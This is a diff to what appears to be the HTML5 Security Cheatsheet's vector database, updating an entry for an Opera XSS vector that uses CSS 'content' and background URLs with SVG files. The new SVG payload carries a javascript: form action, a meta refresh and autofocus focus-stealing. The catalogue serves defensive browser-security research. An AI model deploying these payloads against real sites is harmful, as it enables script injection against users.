@@ -3177,18 +3177,18 @@ var items =
             'cs' : 'SVG obrázky obsahující XML data - s vypnutým JavaScriptem',
             'de' : ''
         },
-        'data'       : '<div style=content:url(%svg_path_2%)></div>',
+        'data'       : '<!-- Up to Opera 10.63 -->\r\n<div style=content:url(%svg_path_2%)></div>\r\n\r\n<!-- Up to Opera 11.61 - see link below -->\r\n\r\n<!-- Up to Opera 12.x -->\r\n<div style="background:url(%svg_path_3%)"></div>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
             'crossdomain'    : '0',            
-            'path'          : 'http://html5sec.org/test2.svg',
-            'name'          : 'test2.svg',
-            'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%"><input value="XXX" type="submit"/></form>'
+            'path'          : 'http://html5sec.org/test5.svg',
+            'name'          : 'test5.svg',
+            'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="javascript:alert(1)">\r\n<!--  this file can be crossdomain if "action" attribute refers to an external file -->\r\n<meta http-equiv="refresh" content="1;URL=%svg_path_3%"/>\r\n<input type="submit" autofocus="autofocus"/>\r\n</form>'
         },
         'description': {
-            'en' : 'Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. The same works for SVG files embedded via <IMG> tags.',
+            'en' : 'Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example for Opera 10.x shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. Example for Opera 12.x shows one of the problems (along with a client side DoS, running the "onblur" event, etc), which is generated because of the possibility to steal a focus via embeded SVG image.  The same works of course for SVG files embedded via <IMG> tags.',
             'ja' : '',
-            'ru' : 'Opera поддерживает CSS-свойство content в стилевом атрибуте. В качестве его значения может быть указан объект, который заместит html-тег. Такой же эффект (а именно вставка ифрейма на страницу) происходит при вставке SVG-изображения через тег <IMG>.',
+            'ru' : 'Opera поддерживает CSS-свойство content в стилевом атрибуте. В качестве его значения может быть указан объект, который заместит html-тег. Пример для Opera 12 показывает одну из проблем (наряду с DoS\'ом с клиентской стороны, запуском события onblur и т.д.), которую порождает возможность похитить фокус пользователя с помощью внедренного SVG-изображения. Такой же эффект (а именно вставка ифрейма на страницу) происходит при вставке SVG-изображения через тег <IMG>.',
             'cs' : 'Opera podporuje CSS vlastnost "content" pro atributy stylu. Obrázek ve formátu SVG může obsahovat SVG stejně dobře jako HTML kód. Příklad ukazuje jak může být tag <FORM> použit pro nalákání uživatele ke kliknutí na tlačítko a tím k provedení JavaScriptu. Stejné pracuje také pro SVG soubory vložené pomocí tagu <IMG>.',
             'de' : ''
         },
@@ -3201,7 +3201,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-	       'opera'  : ['10.x', '11.0']
+	       'opera'  : ['10.x', '11.0', '12.0']
         },
         'tags'       : ['xss', 'svg', 'css', 'opera', 'content', 'form'],
         'reporter'   : 'LeverOne'
